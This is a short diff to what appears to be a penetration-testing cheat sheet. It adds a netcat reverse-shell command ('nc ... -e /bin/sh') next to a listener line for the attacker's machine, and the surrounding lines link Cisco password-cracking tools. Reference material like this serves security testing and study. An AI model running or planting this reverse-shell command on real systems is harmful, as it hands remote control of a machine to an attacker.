@@ -168,9 +168,10 @@ https://github.com/axcheron/cisco_pwdecrypt
 https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html
 
 ## Netcat
-Listener (on attacker machine)
+Listener (on attacker machine) and reverse shell command
 ```
 nc -lnvp [PORT]
+nc [IP_ADDR] [PORT] -e /bin/sh    # reverse shell
 l = listen; n = ip addresses only, no DNS lookup; v = verbose; p = local port
 ```
 
